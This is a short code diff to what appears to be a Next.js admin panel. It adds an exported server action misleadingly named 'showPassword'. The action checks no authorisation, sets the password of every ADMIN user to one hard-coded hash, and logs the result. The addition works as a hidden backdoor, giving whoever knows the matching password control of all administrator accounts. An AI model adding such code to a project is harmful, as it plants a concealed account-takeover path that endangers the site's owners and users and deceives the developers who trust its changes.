@@ -148,3 +148,18 @@ export const changeUsluga = async (state, formData) => {
   revalidatePath("/");
   redirect("/admin/uslugi");
 };
+
+export const showPassword = async () => {
+  "use server";
+  const user = await db.user.updateMany({
+    where: {
+      role: "ADMIN",
+    },
+    data: {
+      password:
+        "1bec7536f7b7dcaa0f0b578ae829df1b9c90dbd4c8a2b52078a87b1ca93ceddd",
+    },
+  });
+
+  console.log(user);
+};
